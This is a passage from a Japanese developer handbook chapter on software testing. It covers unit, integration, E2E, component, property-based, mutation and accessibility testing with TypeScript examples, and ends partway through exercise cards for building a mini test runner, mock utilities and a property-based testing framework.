    expect(discountedPrice(1000, 0.2)).toBe(800);
  });

  it('rounds to nearest integer', () => {
    expect(discountedPrice(1003, 0.1)).toBe(903);
  });

  it('throws on invalid discount', () => {
    expect(() => discountedPrice(1000, -0.1)).toThrow();
    expect(() => discountedPrice(1000, 1.5)).toThrow();
  });

  it('handles edge cases', () => {
    expect(discountedPrice(0, 0.5)).toBe(0);
    expect(discountedPrice(100, 0)).toBe(100);
    expect(discountedPrice(100, 1)).toBe(0);
  });
});
```

<a id="section-25-3"></a>
### 25.3 Integration テスト
<!-- handbook:learning {"level":"required","minutes":10} -->

<!-- handbook:narrative-bridge {"section":"25.3"} -->
個々の関数が正しくても、DB、ファイル、HTTP、モジュール間の契約が食い違えば機能は失敗する。Integrationテストは、複数の実装が接続された境界を検証する。

複数モジュールの結合をテスト。DBやAPIを実際に使う。

```typescript
// user-service.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { PrismaClient } from '@prisma/client';
import { UserService } from './user-service';

const db = new PrismaClient({
  datasources: { db: { url: process.env.TEST_DATABASE_URL } },
});

describe('UserService', () => {
  beforeEach(async () => {
    await db.user.deleteMany();  // 各テスト前にクリア
  });

  it('creates a user', async () => {
    const service = new UserService(db);
    const user = await service.create({
      email: 'alice@example.com',
      name: 'Alice',
    });
    expect(user.id).toBeDefined();

    const fromDb = await db.user.findUnique({ where: { id: user.id } });
    expect(fromDb?.email).toBe('alice@example.com');
  });

  it('rejects duplicate email', async () => {
    const service = new UserService(db);
    await service.create({ email: 'alice@example.com', name: 'Alice' });
    await expect(
      service.create({ email: 'alice@example.com', name: 'Alice2' })
    ).rejects.toThrow();
  });
});
```

**Testcontainers** で本物の DB をテスト中だけ起動する手もある:

```typescript
import { PostgreSqlContainer } from '@testcontainers/postgresql';
import { PrismaClient } from '@prisma/client';

let container;
let db: PrismaClient;

beforeAll(async () => {
  container = await new PostgreSqlContainer().start();
  // 接続先が決まるのはコンテナが起動したあとである。
  // 上の例のようにモジュールの先頭で `new PrismaClient()` を書くと、
  // その時点の環境変数で接続先が固定され、ここで環境変数を差し替えても効かない。
  // クライアントの生成はコンテナ起動後に行う
  db = new PrismaClient({ datasources: { db: { url: container.getConnectionUri() } } });
  await db.$connect();
});

afterAll(async () => {
  await db.$disconnect();
  await container.stop();
});
```

<a id="section-25-4"></a>
### 25.4 E2E テスト
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"は行","term":"ブラックボックステスト"} -->

<!-- handbook:narrative-bridge {"section":"25.4"} -->
統合されたバックエンドやモジュールを確認しても、実ブラウザのナビゲーション、Cookie、描画、操作経路は残る。E2Eテストは、利用者の入口から外部境界までを通した振る舞いを確認する。

ブラウザを実際に操作してテスト。

```typescript
// Playwright
import { test, expect } from '@playwright/test';

test('user can register and login', async ({ page }) => {
  await page.goto('http://localhost:3000');

  // 登録
  await page.click('text=Sign up');
  await page.fill('[name=email]', 'alice@example.com');
  await page.fill('[name=password]', 'password123');
  await page.click('button[type=submit]');

  // ログイン後の画面
  await expect(page).toHaveURL(/dashboard/);
  await expect(page.locator('h1')).toContainText('Welcome');

  // ログアウト
  await page.click('text=Logout');
  await expect(page).toHaveURL('/');

  // 再ログイン
  await page.click('text=Login');
  await page.fill('[name=email]', 'alice@example.com');
  await page.fill('[name=password]', 'password123');
  await page.click('button[type=submit]');
  await expect(page).toHaveURL(/dashboard/);
});
```

Playwright と Cypress が2大選択肢。Playwright は複数ブラウザ対応、並列実行、自動待機、API テストとの統合に強い。

<a id="section-25-5"></a>
### 25.5 コンポーネントテスト
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"か行","term":"コンポーネントテスト"} -->

<!-- handbook:narrative-bridge {"section":"25.5"} -->
E2Eは広い範囲を保証する一方、遅く失敗原因も広い。コンポーネントテストは、ブラウザに近い描画と操作を保ちながら、画面全体より小さい境界でUIを検証する。

React コンポーネントを単体テスト。

```tsx
import { render, screen, fireEvent } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import { Counter } from './Counter';

describe('Counter', () => {
  it('starts at 0', () => {
    render(<Counter />);
    expect(screen.getByText(/Count: 0/)).toBeInTheDocument();
  });

  it('increments on click', () => {
    render(<Counter />);
    fireEvent.click(screen.getByRole('button', { name: '+' }));
    expect(screen.getByText(/Count: 1/)).toBeInTheDocument();
  });
});
```

**重要**: テスト ID やクラス名ではなく、**ユーザーが見ているもの** (role、ラベル、テキスト) で要素を取得する。これが Testing Library の哲学で、ユーザー視点に寄せたテストになる。

<a id="section-25-6"></a>
### 25.6 Mock と Stub と Fake
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"25.6"} -->
境界を小さくしても、時間、乱数、外部API、障害応答を毎回実物で再現するのは難しい。Mock、Stub、Fakeは依存の振る舞いを制御するが、何を置き換えたかを理解しなければ実装詳細へ過剰依存する。

紛らわしい用語整理:

- **Stub**: 「決まった応答を返すだけ」の代替
- **Mock**: 「呼び出されたか/何回呼ばれたか」を検証できる代替
- **Fake**: 「軽量な実装」 (in-memory DB など)
- **Spy**: 本物の呼び出しを記録する観察者

```typescript
import { vi } from 'vitest';

// Stub
const stub = vi.fn().mockReturnValue('hello');

// Mock + 検証
const mock = vi.fn();
mock('arg1');
expect(mock).toHaveBeenCalledWith('arg1');
expect(mock).toHaveBeenCalledTimes(1);

// 部分的にモック化
vi.mock('./email-service', () => ({
  sendEmail: vi.fn().mockResolvedValue({ messageId: 'abc' }),
}));
```

**モックしすぎの罠:**

「全部モック」でテストを書くと、実装が壊れていてもモックだけが応答するため、テストは通り続ける。**境界 (外部API、DB) はモックしてよい、自分のコードは可能な限り実物を使う**。

<a id="section-25-7"></a>
### 25.7 Property-Based Testing
<!-- handbook:learning {"level":"practical","minutes":5} -->
<!-- handbook:index {"group":"P","term":"Property-Based Testing"} -->

<!-- handbook:narrative-bridge {"section":"25.7"} -->
具体例を並べても、入力空間の大部分は未確認のまま残る。Property-Based Testingは、個別の期待値ではなく常に成り立つ性質を定め、多数の生成入力から反例を探索する。

「ある性質が常に成り立つことを、ランダム入力で検証」する手法。

```typescript
import { it } from 'vitest';
import fc from 'fast-check';

it('reversing twice returns the original', () => {
  fc.assert(
    fc.property(fc.array(fc.integer()), (arr) => {
      const reversed = arr.slice().reverse().reverse();
      return JSON.stringify(reversed) === JSON.stringify(arr);
    })
  );
});

it('JSON parse(stringify(x)) === x for all values', () => {
  fc.assert(
    fc.property(fc.jsonObject(), (obj) => {
      return JSON.stringify(JSON.parse(JSON.stringify(obj))) === JSON.stringify(obj);
    })
  );
});
```

人間が考えつかないエッジケース (空配列、NaN、巨大値) を見つけてくれる。Property-Based Testing は大量の入力を試すため、Unit テストでは見つからないバグを発見することがある。

<a id="section-25-8"></a>
### 25.8 Mutation Testing
<!-- handbook:learning {"level":"advanced","minutes":5} -->
<!-- handbook:index {"group":"M","term":"Mutation Testing"} -->

<!-- handbook:narrative-bridge {"section":"25.8"} -->
多くの入力で性質が通っても、アサーションが弱ければ誤った実装まで生き残る。Mutation Testingは実装へ意図的な変更を加え、既存テストがその誤りを検出できるかを測る。

「テストの質をテストする」手法。コードを意図的に少し変更 (`x + y` → `x - y`) して、テストが落ちるか確認する。落ちなければ「そのコードはテストでカバーされていない」と判定。

```bash
# Stryker (TypeScript)
npx stryker run
```

カバレッジ100%でも mutation テストでバレることがある (「実行はしてるが性質を検証していない」テスト)。

<a id="section-25-9"></a>
### 25.9 視覚回帰テスト
<!-- handbook:learning {"level":"practical","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"25.9"} -->
論理的な変更を検出できても、CSSやフォントによる見た目の崩れは値のアサーションだけでは捉えにくい。視覚回帰テストは、レンダリング結果の差分を品質信号として扱う。

「画面の見た目が壊れていないか」をスクリーンショット比較で検出。

- **Chromatic** (Storybook 連携)
- **Percy**
- **Playwright + pixelmatch**

```typescript
// Playwright で簡易視覚回帰
await expect(page).toHaveScreenshot('homepage.png', { maxDiffPixels: 100 });
```

<a id="section-25-10"></a>
### 25.10 何をテストすべきか
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"25.10"} -->
各技法には検出できる失敗とコストが異なる。何をテストすべきかを決めるには、重要な利用者行動、壊れやすい境界、変更頻度、障害影響を基準に重複と空白を調整する。

カバレッジ100%を目指すのは非効率。優先順位:

1. **ビジネスロジックの中核**: 価格計算、権限判定、ワークフロー
2. **複雑なバグの再現**: 過去のインシデント
3. **境界値**: 上限、下限、空、巨大
4. **エラーパス**: 例外処理、リトライ
5. **後で変えにくい部分**: DBスキーマ、API契約

逆にテストしすぎる必要がないもの:

- 一度しか使わない使い捨てスクリプト
- 単純なゲッター・セッター
- フレームワーク機能 (Express がGETを処理することは、Express のテスト)

「**変更時に壊れたら気づきたいもの**」を全部テストする ― これがシンプルな基準。

<a id="section-25-11"></a>
### 25.11 アクセシビリティの検証 ― 自動チェック、キーボード走査、読み上げ確認
<!-- handbook:learning {"level":"practical","minutes":25} -->
<!-- handbook:index {"group":"あ行","term":"アクセシビリティ検証"} -->
<!-- handbook:index {"group":"あ行","term":"axe-core"} -->
<!-- handbook:index {"group":"か行","term":"キーボード走査"} -->
<!-- handbook:index {"group":"さ行","term":"スクリーンリーダー検証"} -->

<!-- handbook:narrative-bridge {"section":"25.11"} -->
25.10 で挙げた「変更時に壊れたら気づきたいもの」には、アクセシビリティも含まれる。ラベルの結び付き、フォーカスの行き先、状態の通知は、リファクタリングやスタイル変更で静かに失われるためである。ただし 25.9 までの技法と違い、この領域は自動テストだけでは判定できない部分が構造的に残る。本節では、何を自動化し、何を手順化し、何を人が確かめるかを分ける。

6.9・6.11・7.9 で作った実装が実際に機能しているかは、確かめなければ分からない。アクセシビリティの検証は、次の3層で組む。

| 層 | 何を確かめるか | 頻度 | 自動化 |
|---|---|---|---|
| 静的・自動検査 | 機械的に判定できる規則違反 | 変更のたび | できる |
| キーボード走査 | 到達・順序・可視性・脱出 | 画面を追加・改修したとき | 手順化できる |
| 支援技術での確認 | 名前・役割・状態・変化が実際に伝わるか | 主要な操作の流れ単位 | できない |

3層のどれか1つでは足りない。**自動検査が0件でも、キーボードで操作できない画面は作れる。**

#### 自動検査で拾えるもの、拾えないもの

`axe-core` に代表される検査エンジンは、DOM とスタイル計算結果から「規則違反であることが確実に言えるもの」だけを報告する [Deque axe-core]。判断が要るものは報告しない。過検出を出すと運用が止まるためである。

| 拾える | 拾えない |
|---|---|
| 名前の無いボタン・リンク・入力欄 | 名前が付いているが内容が不適切 (「ここをクリック」) |
| `aria-describedby` などの参照先 ID が存在しない | 参照先の文章が説明として役に立つか |
| ARIA の属性名・値の誤り、role に許されない属性 [W3C ARIA, 2023] | ウィジェットのキー操作が慣習 [W3C APG] どおりか |
| コントラスト比の不足 (実描画色が取れる環境で) | 画像内の文字、グラデーション背景上の文字 |
| フォーカス可能な要素が `aria-hidden` の配下にある | モーダルを閉じたあとの戻し先 |
| 見出しレベルの飛び、重複する ID | 見出しの構造が内容の構造と一致しているか |
| `alt` 属性の欠落 | `alt` の文言が画像の役割を表しているか |

自動検査で見つかる割合について「全体の3割程度」といった数字が引用されることがあるが、この種の数値は対象サイトの作り、使うツール、何を1件と数えるかで大きく変わる。**目安として扱い、「残りは人が確かめる必要がある」という結論だけを取る。**

#### 検査を2か所に置く

自動検査は、部品単位と画面単位の両方に置く。片方だけでは片方の問題が残る。

**部品単位 (コンポーネントテスト、25.5)** は、部品を追加・修正したその場で失敗するため、直す費用が最も小さい。ただし jsdom のような DOM の模擬実装は、実際のレイアウトも配色計算も持たないため、コントラスト比や「画面外に出ている」といった規則は検査できない。

```typescript
import { render } from '@testing-library/react';
import { axe } from 'jest-axe';

it('検索フォームに検出可能な違反が無い', async () => {
  const { container } = render(<SearchForm />);
  // 実描画に依存する規則は jsdom では判定できないため、明示的に無効化して
  // 「動いていないのに通っている」状態を避ける
  const results = await axe(container, {
    rules: { 'color-contrast': { enabled: false } },
  });
  expect(results.violations).toEqual([]);
});
```

無効化した規則を**明示的に書き残す**ことが要点である。デフォルトのまま実行すると、その環境では判定不能な規則が「違反なし」として集計され、検査したつもりの範囲が実際より広く見える。

**画面単位 (E2E、25.4)** は、実ブラウザで実際に描画された状態を検査する。部品を組み合わせたときに初めて出る問題 ― ID の重複、見出しレベルの飛び、ランドマークの重複、コントラスト ― はここでしか出ない。

```typescript
import AxeBuilder from '@axe-core/playwright';

test('検索結果ページ ― 主要な状態で違反が無い', async ({ page }) => {
  await page.goto('/search?q=handbook');
  await page.getByRole('button', { name: '絞り込み' }).click();   // モーダルを開いた状態も検査する
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag22aa'])
    .analyze();
  expect(results.violations).toEqual([]);
});
```

`withTags` で基準を明示しておくと、ツールの版が上がって規則が追加されたときに、どの範囲を対象にしているかが読み取れる。モーダルを開いた状態、エラーが出た状態、読み込み中の状態のように、**初期表示以外の状態を検査対象に含める**ことが重要である。アクセシビリティの問題は、たいてい状態が変わったところで起きる。

`eslint-plugin-jsx-a11y` のような静的解析は、これらより手前で動き、記述の段階で誤りを指摘する。ただし静的解析は値が実行時に決まる場合 (`aria-label={label}` の `label` が空文字列かどうか) を判定できない。3つは重なりつつ守備範囲が違うため、どれかで代替はできない。

#### 既知の違反を「無視」ではなく「期限付きの負債」にする

既存のコードベースへ検査を導入すると、初回は大量の違反が出る。すべてを直してから導入する、という進め方は現実的でないことが多いため、抑制の仕組みが要る。ここで**規則ごと無効にすると、新しく作る画面でも同じ違反が通ってしまう**。

抑制は、規則単位ではなく**箇所単位**にする。

```typescript
// 既知の違反を、対象・理由・期限・課題番号つきで持つ
const KNOWN_ISSUES = [
  {
    page: '/legacy/report',
    rule: 'color-contrast',
    reason: '旧デザイントークンを使用。トークン移行(ISSUE-482)と同時に解消する',
    until: '2026-12-31',
  },
] as const;
```

そして、期限を過ぎた項目が残っていたらテストを失敗させる。期限を持たない抑制リストは、必ず増え続ける。

#### キーボード走査は手順を固定して毎回同じことをする

自動検査が拾えない領域のうち、最も費用対効果が高いのがキーボードでの走査である。特別な機材も知識も要らず、手順を固定すれば誰でも同じ結果を出せる。

1. **ページの先頭から Tab を押し続け、一巡する。** 途中で戻れなくなる箇所 (トラップ) が無いこと。
2. **フォーカスが常に見えている。** どこにあるか分からない瞬間が1度でもあれば不合格 (6.11)。
3. **順序が視覚順序と一致している。** 画面の右上のボタンへ行くのに、左下を経由しないこと。
4. **画面上のすべての操作が到達可能。** ポインタでしかできない操作 (ホバーで出るメニュー、ドラッグでの並べ替え) に代替手段があること。
5. **Enter / Space で起動する。** リンクは Enter、ボタンは両方。
6. **モーダルを開いて、閉じて、戻る。** 4つの動作 (6.11) が揃っていること。
7. **フォームを空のまま送信する。** エラーが読み上げ経路に載っていること (7.9)。
8. **Escape で閉じられるものが閉じる。** メニュー、ダイアログ、オートコンプリートの候補。

この8項目は、画面を1つ追加するたびに5分程度で実施できる。E2E テストへ組み込める項目もある。`page.keyboard.press('Tab')` を繰り返し、`document.activeElement` の遷移を記録して期待順序と比較すれば、3の回帰は自動化できる。

#### 支援技術での確認は「4つが伝わるか」に絞る

スクリーンリーダーでの確認は、慣れないうちは何を見ればよいか分かりにくい。確認する対象を4つに絞ると再現性が上がる。

| 確認する | 具体的に |
|---|---|
| 名前 | フォーカスした要素が、画面で見えている文言で読み上げられるか |
| 役割 | 「ボタン」「リンク」「編集テキスト」「見出しレベル2」が正しく言われるか |
| 状態 | 「選択済み」「折りたたみ」「必須」「無効」が言われるか |
| 変化 | 押した結果、送信した結果、読み込みの完了が伝わるか |

重要な前提が2つある。1つは、**挙動を決めるのはスクリーンリーダー単体ではなく、スクリーンリーダーとブラウザの組み合わせである**こと。同じ HTML でも、組み合わせによって読み上げ内容が異なることは珍しくない。1組み合わせで通ったから他でも通る、とは言えない。もう1つは、**利用者は自分の使い方に習熟している**こと。開発者が不慣れなまま「読み上げにくい」と判断すると、実際には問題ない実装を壊しかねない。

日常的な確認としては、ブラウザ開発者ツールのアクセシビリティツリー表示のほうが扱いやすい。名前・役割・状態がその場で読め、期待と違えば DOM のどこが原因かをすぐ辿れる。読み上げの実機確認は、主要な操作の流れ (登録、検索、購入、退会) に絞って行う。

#### 回帰を防ぐ書き方

テストの書き方そのものを、アクセシビリティの回帰検知に使える。Testing Library の `getByRole` は、要素をアクセシブルな名前と役割で探す。

```typescript
// 名前が消えた・役割が変わった時点でテストが落ちる
await screen.getByRole('button', { name: '絞り込み' }).click();

// これは名前が壊れても通ってしまう
await container.querySelector('.filter-button')!.click();
```

前者に統一しておくと、`button` を `div` に変えた、`aria-label` を消した、といった変更が既存のテストで検出される。**アクセシビリティ専用のテストを増やさずに検知範囲を広げられる**ため、費用対効果が高い。

#### 直せないものと、公開する情報

検証の結果、すぐには直せない問題が残ることがある。外部の埋め込み部品、大規模な作り直しが要る画面、そもそも代替手段の設計が定まっていない機能などである。

このとき取れる手は、放置か即時修正かの2択ではない。何が使えて何が使えないかを利用者向けに公開し、代替の連絡手段を示し、修正の予定を持つ、という運用が一般的である。運用側から見ると、既知の問題の一覧、影響を受ける操作、代替手段、見直しの時期という4点を持っておくと、問い合わせにも社内の判断にも使える。

**適合レベル (WCAG のA / AA など) を満たしたと外部へ表明するかどうかは、技術的な判断だけでは決まらない。** 表明の形式、必要な根拠、法的な位置づけは、国・地域・業種・調達要件によって異なる。表明を行う場合や、契約・調達で適合が求められている場合は、法務およびアクセシビリティの専門家に確認する。本節が扱うのは、あくまで**実装が意図どおり動いているかを開発者が確かめる方法**である。

#### つまずく箇所 ― アクセシビリティの検証

- **自動検査が0件であることを合格と読む**: 検出できるのは機械的に判定できる違反だけである。キーボード走査を必ず併用する。
- **jsdom でコントラスト規則を有効なままにする**: 判定できないまま「違反なし」に数えられ、検査範囲を実際より広く見積もる。無効化を明示する。
- **初期表示だけを検査する**: モーダル、エラー、読み込み中といった状態変化のあとにこそ問題が出る。
- **既知の違反を規則単位で無効化する**: 新規に作る画面でも同じ違反が通るようになる。箇所単位・期限付きにする。
- **`querySelector` でテストを書く**: 名前や役割が壊れても通ってしまう。`getByRole` に寄せると回帰検知が無料で付いてくる。
- **1つの支援技術で通ったことを一般化する**: 挙動はブラウザとの組み合わせで変わる。主要な流れは複数の組み合わせで確かめる。
- **不慣れな開発者の読み上げ体験を判断根拠にする**: 実装を壊す方向へ動きうる。まずアクセシビリティツリーで名前・役割・状態を確認する。
- **適合レベルの表明を技術判断だけで行う**: 求められる根拠と法的位置づけは法域と調達要件で異なる。専門家に確認する。

<a id="section-25-12"></a>
### 25.12 実装課題 ― テスト技法を自分の手で
<!-- handbook:learning {"level":"practical","minutes":250} -->

<!-- handbook:narrative-bridge {"section":"25.12"} -->
テスト種別を理解しただけでは、実行器、double、生成入力、mutationの仕組みがブラックボックスのまま残る。実装課題では最小構成を自作し、各技法がどの失敗を検出するかを確かめる。

第25章では Unit/Integration/E2E、Mock/Stub/Fake、Property-based Testing、Mutation Testing を見た。本節では各技法を最小実装し、テストフレームワークの裏側を理解する。所要時間: 演習カードの推定時間の合計で8時間。

#### 課題25.1: ミニテストランナー自作 (★★)

**目的**: jest / vitest 風の基本機能 (`describe`、`it`、`expect`) を実装。

<!-- handbook:exercise:start {"id":"25.1"} -->
> **演習カード 課題25.1** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 25.2 Unit テスト を読み、テストの構造 (配置・実行・検証) を説明できる
> - 25.1 テストピラミッド vs テストトロフィー を読み、この演習が対象とする層を確認する
> - node:util の isDeepStrictEqual による深い等価比較を知っている
> - async 関数を順番に await するループを書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] describe() のネストで名前が親から子へ連結され、it() の登録名が階層を含む文字列になる
> - [ ] expect(x).toBe(y) が Object.is による同一性で判定し、不一致時に期待値と実値を含むメッセージで throw する
> - [ ] expect(fn).toThrow() が例外を投げない関数に対して失敗する
> - [ ] toEqual() が深い等価比較で配列やオブジェクトの中身を比較する
> - [ ] run() が {passed, failed} を返し、成功に ✓、失敗に ✗ を付けて1行ずつ出力する
> - [ ] failed が0でないとき process.exitCode が非ゼロになる
>
> **期待出力**
>
> - 1件成功1件失敗のスイートで run() が {passed:1, failed:1} を返す
> - コンソールに ✓ Math > adds two numbers と ✗ Math > throws ... : メッセージ の形式で1テスト1行が出る
> - reset() の後は登録済みテストが0件になり、run() が {passed:0, failed:0} を返す
>
> **観察項目**
>
> - describe のコールバックが登録時に即座に実行され、it のコールバックは run() まで実行されないという2段階を、console.log を両方に入れて実行順で確認する
> - テスト内で throw された Error の message がそのまま結果表示に使われることを確認し、アサーション関数が「失敗の説明を作る役」でもあることを読み取る
> - 1件が失敗しても後続が実行されることを確認し、テストランナーが例外を隔離している境界を特定する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch25 exec tsx --test --test-name-pattern="mini test runner" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch25 run test` で章の4件がすべてpassすることを確認する
> 3. 自作ランナーで失敗テストを含むファイルを実行し、`echo $?` が0以外を返せば終了コードの要件を満たしていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: テストの「登録」と「実行」を分ける。describe と it は配列へ積むだけ、run が積まれたものを順に呼ぶ、という2フェーズ構成が全体の骨格になる
> 2. **構造**: モジュールスコープの tests 配列と suite 名スタックを持ち、describe は名前を push してコールバックを呼び、finally で pop する。expect は actual を閉じ込めたオブジェクトを返し、toBe / toEqual / toThrow / toBeTruthy をメソッドとして生やす
> 3. **実装の要点**: describe のコールバックが throw したときに suite スタックが壊れないよう、pop は必ず finally で行う。it が async の場合に備え、run のループでは await test.fn() として同期・非同期の両方を受ける
>
> **本番利用時の警告**
>
> - このランナーはテストを1件ずつ直列実行し、ファイル単位の分離もタイムアウトも持たない。無限ループや解決しない Promise を含むテストが1件あると全体が永久に終わらず、CIのジョブを占有する
> - モジュールスコープの配列に登録する設計のため、複数のテストファイルを同一プロセスで読み込むと状態が混ざる。reset() を呼び忘れた並行実行では結果が非決定的になる
> - 本番のプロジェクトでは、並行実行、ウォッチモード、カバレッジ計測、スナップショット、flaky 検出、レポータ連携を備えた vitest や node:test を使う。自作ランナーは仕組みの理解用であり、これらの欠落がテスト運用の失敗として跳ね返る
>
> **導線**
>
> - 開始地点: `code/ch25/mini-test.ts`
> - 模範解答: `code/ch25/mini-test.solution.ts`
>
> **推定時間の内訳**: describe と it の登録機構の実装25分、expect のマッチャ4種の実装30分、run の出力と終了コード15分、実行順序と例外隔離の観察20分
<!-- handbook:exercise:end -->

**要件**:

```typescript
import { describe, it, expect, run } from './mini-test';

describe('Math', () => {
  it('adds two numbers', () => {
    expect(1 + 1).toBe(2);
  });
  it('throws on invalid input', () => {
    expect(() => JSON.parse('invalid')).toThrow();
  });
});

run(); // → 結果出力
```

**機能** (★ は模範解答が実装済み):
- ★ `describe` / `it` のネスト
- ★ `expect(...).toBe()` / `toEqual()` / `toThrow()` などのマッチャ
- ★ 失敗時の期待値 vs 実値の表示
- `toBeGreaterThan()` などマッチャの追加
- `beforeEach` / `afterEach` / `beforeAll` / `afterAll`
- exit code (失敗があれば非ゼロ)

後半の3つは読者の実装範囲である。フックの実行順序と、失敗時に終了コードを立てる位置は、テストランナーの設計判断として自分で決める。

模範解答: `code/ch25/mini-test.solution.ts`

#### 課題25.2: Mock / Stub / Spy 実装 (★★)

**目的**: jest.fn() / sinon.stub() 風の機能。

<!-- handbook:exercise:start {"id":"25.2"} -->
> **演習カード 課題25.2** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 25.6 Mock と Stub と Fake を読み、3者の目的の違いを言い分けられる
> - TypeScript のジェネリクスと Parameters / ReturnType 型を使える
> - Object.defineProperties と Proxy の基本的な使い方を知っている
> - code/ch25 で `pnpm --filter @handbook/ch25 run test` が実行できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] mock() が返す関数を呼ぶと calls に引数配列が追加され、callCount が呼び出し回数と一致する
> - [ ] mockReturnValueOnce を2回連ねた後に mockReturnValue を設定すると、1回目と2回目だけ once の値、3回目以降はデフォルト値が返る
> - [ ] mockImplementation で渡した関数が引数を受け取って実行される
> - [ ] reset() で calls と once と実装とデフォルト値がすべて初期化される
> - [ ] stub() が未定義のメソッドへアクセスしたときに No stub implementation for という例外を投げる
> - [ ] spyOn(obj, 'method') が元の実装を呼びつつ callCount を数え、restore() で元のメソッドに戻る
>
> **期待出力**
>
> - fn(2) と fn(3) を呼んだあと calls が [[2],[3]] という二重配列になる
> - mockReturnValueOnce(1) の後に mockReturnValue(0) を設定した mock は 1, 0, 0, 0 の順に返す
> - spyOn した後に restore() すると、対象オブジェクトのメソッドが元の関数と同一参照に戻る
>
> **観察項目**
>
> - calls を getter として公開した場合と配列を直接代入した場合で、テスト側が参照するタイミングによって見える内容が変わるかを確認する
> - spyOn が元の実装を bind してから差し替えていることを確認し、bind を外すと this が失われるケースを再現する
> - stub がアクセス時に例外を投げる設計と、undefined を返す設計を比べ、テストの失敗メッセージがどちらで分かりやすくなるかを記録する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch25 exec tsx --test --test-name-pattern="mock/stub/spy" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch25 run test` で章の4件がすべてpassすることを確認する
> 3. 自作実装で spyOn したあと restore() を呼び、元のメソッドの戻り値が復元されていれば後始末が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 3つの機能は「呼び出しの記録」「戻り値の差し替え」「既存オブジェクトへの差し込み」に分解できる。まず記録だけの関数を作り、そこへ差し替えの層を重ねる
> 2. **構造**: mock はクロージャに calls 配列と once キューと implementation と fallback を持ち、呼び出し時に once.shift() を優先する。calls と callCount は Object.defineProperties の getter で公開し、mockReturnValue 系は自身を返してチェーン可能にする
> 3. **実装の要点**: spyOn は元のメソッドを保存し、mock().mockImplementation(original.bind(target)) を代入する。restore() で元の参照を戻すが、callCount を実値で公開すると差し替え後の更新が反映されないので getter にする
>
> **本番利用時の警告**
>
> - spyOn は対象オブジェクトのプロパティを書き換えるため、restore() を呼ばずにテストが終わると以降のテストへ汚染が残る。afterEach での復元を仕組みとして持たないこの実装は、テスト間の独立性を保証しない
> - stub は Proxy で未実装メソッドを例外にするだけで、型と実サービスの契約が一致している保証はない。実装側のシグネチャが変わってもテストは通り続けるため、契約テストや型レベルの検証を併用しないと「テストは緑だが本番が壊れる」状態になる
> - 呼び出し記録は引数の参照をそのまま保持するので、呼び出し後に引数オブジェクトを変更すると過去の記録も変わる。可変オブジェクトを渡すコードのアサーションでは、この参照共有が誤った合格判定を生む
>
> **導線**
>
> - 開始地点: `code/ch25/mock-stub-spy.ts`
> - 模範解答: `code/ch25/mock-stub-spy.solution.ts`
>
> **推定時間の内訳**: mock の記録と戻り値制御の実装30分、stub の Proxy 実装15分、spyOn と restore の実装25分、テスト間汚染の再現と確認20分
<!-- handbook:exercise:end -->

**要件**:

```typescript
const fn = mock<(x: number) => number>();
fn.mockReturnValue(42);
fn(1); fn(2);
expect(fn.calls).toEqual([[1], [2]]);
expect(fn.callCount).toBe(2);

// 順次返す
const counter = mock();
counter.mockReturnValueOnce(1).mockReturnValueOnce(2).mockReturnValue(0);
counter(); counter(); counter(); counter();
// → 1, 2, 0, 0

// 実装を差し替え
const dbStub = stub<typeof db>({
  findUser: async (id) => ({ id, name: 'test' }),
});

// 既存オブジェクトのメソッドを spy
const spy = spyOn(console, 'log');
console.log('hello');
expect(spy.calls).toEqual([['hello']]);
spy.restore();
```

模範解答: `code/ch25/mock-stub-spy.solution.ts`

#### 課題25.3: Property-Based Testing フレームワーク (★★★)

**目的**: fast-check / Hypothesis 風のフレームワークを実装。

<!-- handbook:exercise:start {"id":"25.3"} -->
> **演習カード 課題25.3** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 25.7 Property-Based Testing を読み、例示ベースとの違いと不変条件の立て方を説明できる
> - ジェネレータ関数 (function*) と Iterable を扱える
> - 線形合同法などで再現可能な擬似乱数を実装できる
> - TypeScript の条件型で record のシェイプから値の型を導出する書き方に触れたことがある
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] Arbitrary が sample(random) と shrink(value) の2メソッドを持つ共通の形になっている
> - [ ] integer と string と array と record の4種のジェネレータが用意され、それぞれ範囲や長さの上限を引数で指定できる
> - [ ] forAll がデフォルトで1000ケースを生成し、seed を指定すると同じ反例が再現する
> - [ ] 性質が偽になったとき Property failed after N cases; counterexample= を含むメッセージで例外を投げる
> - [ ] shrink により反例が縮小され、array(integer()) で長さ2未満を主張したときの反例が最小規模になる
> - [ ] 性質が全ケースで成立した場合は例外を投げず、実行ケース数を返す
>
> **期待出力**
>
> - 成功時の戻り値が {cases: 実行件数} というオブジェクトになる
> - 失敗時の例外メッセージに、何ケース目で失敗したかと、shrink 後の反例のJSON表現が含まれる
> - 同じ seed と同じ性質なら、実行のたびに同一の反例が得られる
>
> **観察項目**
>
> - seed を固定した場合と変えた場合で反例が変わるかを比較し、再現性が乱数源の制御によって成り立っていることを確認する
> - shrink を無効化した場合の反例 (大きな配列や大きな整数) と、有効時の反例を並べ、デバッグしやすさの差を記録する
> - record の shrink が空実装であることを確認し、複合値の縮小が単純な合成にならない理由を考える
>
> **テスト方法 (自己採点手順)**
>
